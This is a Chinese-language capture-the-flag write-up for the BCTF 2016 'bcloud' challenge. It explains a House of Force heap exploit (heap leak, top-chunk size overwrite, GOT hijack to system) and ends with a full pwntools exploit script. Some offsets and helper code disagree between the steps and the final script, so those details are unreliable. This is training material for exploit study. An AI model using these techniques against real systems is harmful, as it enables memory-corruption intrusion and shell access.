# BCTF 2016 bcloud

###漏洞简介
> `House of Force:` 修改`top chunk `的`size`域，来达到我们任意地址读写的目的.

### 程序运行(主要功能)
**1. welcome**
```
Input your name:
Bill
Hey Bill! Welcome to BCTF CLOUD NOTE MANAGE SYSTEM!
Now let's set synchronization options.
Org:
cust
Host:
210.47.0.1
OKay! Enjoy:)
```
**2. menu**
```
1.New note
2.Show note
3.Edit note
4.Delete note
5.Syn
6.Quit
option--->>
```
**3. new**
```
1
Input the length of the note content:
20
Input the content:
hello,world
Create success, the id is 0

0x804b120 --> [content] -->  content
0x804b0a0 --> [length] --> length
0x804b0e0 --> [syn]
```
**4. edit**
```
3
Input the id:
0
Input the new content:
hello,world
Edit success.
```
**5. delete**
```
4
Input the id:
0
Delete success.
```
### 程序分析
> 漏洞点: 在`welcome`阶段存在一个内存泄露和复制过量的数据

**第一个漏洞点**
```
int sub_80487A1()
{
  char s; // [sp+1Ch] [bp-5Ch]@1
  char *v2; // [sp+5Ch] [bp-1Ch]@1
  int v3; // [sp+6Ch] [bp-Ch]@1

  v3 = *MK_FP(__GS__, 20);
  memset(&s, 0, 0x50u);
  puts("Input your name:");
  inputstring((int)&s, 0x40, 10);
  v2 = (char *)malloc(0x40u);
  dword_804B0CC = (int)v2;
  strcpy(v2, &s);// 漏洞点
  welcome((int)v2);
  return *MK_FP(__GS__, 20) ^ v3;
}
```
&nbsp;&nbsp;&nbsp;&nbsp;分析: 当我们输入`0x40`字符时, `strcpy`会将字符和`v2地址`一同复制到v2指向的空间. 随后会将`v2`打印出来, 这就是内存泄露.

**第二个漏洞点**
```
int sub_804884E()
{
  char s; // [sp+1Ch] [bp-9Ch]@1
  char *v2; // [sp+5Ch] [bp-5Ch]@1
  int v3; // [sp+60h] [bp-58h]@1
  char *v4; // [sp+A4h] [bp-14h]@1
  int v5; // [sp+ACh] [bp-Ch]@1

  v5 = *MK_FP(__GS__, 20);
  memset(&s, 0, 0x90u);
  puts("Org:");
  inputstring((int)&s, 0x40, 10);
  puts("Host:");
  inputstring((int)&v3, 0x40, 10);
  v4 = (char *)malloc(0x40u);
  v2 = (char *)malloc(0x40u);
  dword_804B0C8 = (int)v2;
  dword_804B148 = (int)v4;
  strcpy(v4, (const char *)&v3);
  strcpy(v2, &s);
  puts("OKay! Enjoy:)");
  return *MK_FP(__GS__, 20) ^ v5;
}
```
&nbsp;&nbsp;&nbsp;&nbsp;分析: 同样当我们输入`0x40`到`s`中去, `strcpy(v2, &s)`就会将`0x40个字符 + v2地址 + v3内容`一同复制进`v2`,造成复制过多的数据, 这个地方就是修改 `top chunk size`.

**小例子**
```c
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>

int main(void){
    char* s1 = malloc(0x20);
    read(0, s1, 0x48);
    printf("s1 is %s", s1);
    return 0;
}
```
相关内存:
```
sbrk_base  0x804b000
chunk      0x804b000        0x28(0x8 字节header + 0x20内容)   (inuse)
chunk      0x804b028        0x20fd8(top chunk size) -------------------
sbrk_end   0x806c000                                                  |
                                                                      |
0x804b000:	0x00000000	0x00000029	0x00000000	0x00000000            |
0x804b010:	0x00000000	0x00000000	0x00000000	0x00000000            |
0x804b020:	0x00000000	0x00000000	0x00000000	0x00020fd9  <----------          
0x804b030:	0x00000000	0x00000000	0x00000000	0x00000000

sbrk_base  0x804b000
chunk      0x804b000        0x28            (inuse)
chunk      0x804b028        0x41414140      (already changed)
```
&nbsp;&nbsp;&nbsp;&nbsp;结论: `top chunk size`在`0x804b020`,我们完成可以向s1中输入过量的数据改变`top chunk size`.

###　过程

**整体思路**
> &nbsp;&nbsp;&nbsp;&nbsp;修改`top chunk size`为`0xffffffff`, malloc一个赋值, 使`top chunk`分配到`.bss`段附近.
&nbsp;&nbsp;&nbsp;&nbsp;`0x804b120`中存放的是`content`指针, 通过修改这些指针, 达到任意读写目的.

**步骤一: 泄露heap地址, 修改top chunk size**
```python
name = "Bill"*0x10
org = "A" * 0x40
host = p32(0xffffffff) #top chunk size足够大
leak = welcome(name, org, host)
```
**步骤二: 修改top chunk的值**
```python
bss = 0x804b0a0
length = bss - 8 - (leak + 0x48*3 - 8) - 12
newcontent=''
new(length, newcontent)
```
**步骤三**
**思路:**　修改原`0x804b120`处存储的指针, 将`free@got`修改为`print@plt`, 泄露`atoi`函数地址
```python
printf = elf.plt['printf']
free = elf.got['free']
atoi = elf.got['atoi']

payload = "A"*128 + p32(atoi) + p32(free) + p32(atoi)
length = len(payload)
new(length, payload)
edit(1, p32(printf))
delete(0)
```
**步骤四: 修改atoi为system函数地址**
```python
real_atoi = u32(p.recv()[0:4])
log.info("readatoi: %s" % hex(real_atoi))
system = real_atoi - (libc.symbols['atoi'] - libc.symbols['system'])
edit(2, p32(system))
```

**步骤五: 发送"/bin/sh\x00"**
```python
length = "/bin/sh\x00"

p.recvuntil("--->>")
p.sendline("1")
p.recvuntil("Input the length of the note content:\n")
p.sendline(str(length))
p.interactive()
```
### 相关问题
*改变top chunk至.bss是什么算的?*
> `0x804b0a0 - 8 - (leak + 0x48*3 -8) - 12`

**原因:** 咱们的目的是为了返回`0x804b0a0`, `top chunk`必须为`0x804b098`, 程序中还会为你申请的空间+4, 还要有8字节的`header`,所以是减12, 另外的就是单纯的算距离了.

### 完整EXP
```python
from pwn import *

p = process("./bcloud")
elf = ELF("./bcloud")
libc = ELF("./libc.so.6")
context.log_level = 'debug'

def welcome(name, org, host):
    p.recvuntil("name:\n")
    p.send(name)
    chunkfirst = u32(p.recvuntil("! Welcome")[-13:-9])
    log.info("chunkfirst: %s" % hex(chunkfirst))
    p.recvuntil("Org:\n")
    p.send(org)
    p.recvuntil("Host:\n")
    p.sendline(host)
    return chunkfirst

def new(length, content):
    p.recvuntil("--->>")
    p.sendline("1")
    p.recvuntil("Input the length of the note content:\n")
    p.sendline(str(length))
    p.recvuntil("Input the content:\n")
    p.send(content)

def show():
    p.recvuntil("--->>")
    p.sendline("2")

def edit(id, newcontent):
    p.recvuntil("--->>")
    p.sendline("3")
    p.recvuntil("id:\n")
    p.sendline(str(id))
    p.recvuntil("new content:\n")
    p.sendline(newcontent)

def delete(id):
    p.recvuntil("--->>")
    p.sendline("4")
    p.recvuntil("id:\n")
    p.sendline(str(0))

#part one
# gdb.attach(p)
name = "Bill"*0x10
org = "A" * 0x40
host = p32(0xffffffff)
leak = welcome(name, org, host)

#part two
bss = 0x804b0a0
length = bss - 8 - (leak + 0x48*3 - 8) - 8
newcontent=''
new(length, newcontent)
#edit(0, "B"*20)
#delete(0)


#part three
printf = elf.plt['printf']
free = elf.got['free']
atoi = elf.got['atoi']

payload = "A"*128 + p32(atoi) + p32(free) + p32(atoi)
length = len(payload)
new(length, payload)
edit(1, p32(printf))
delete(0)

# part four

real_atoi = u32(p.recv()[0:4])
log.info("readatoi: %s" % hex(real_atoi))
system = real_atoi - (libc.symbols['atoi'] - libc.symbols['system'])
edit(2, p32(system))
length = "/bin/sh\x00"

p.recvuntil("--->>")
p.sendline("1")
p.recvuntil("Input the length of the note content:\n")
p.sendline(str(length))
p.interactive()
```
### 相关链接

[Link1](https://blog.csdn.net/qq_35519254/article/details/77209175)
[Link2](https://www.w0lfzhang.com/2017/03/18/2016-BCTF-bcloud/)
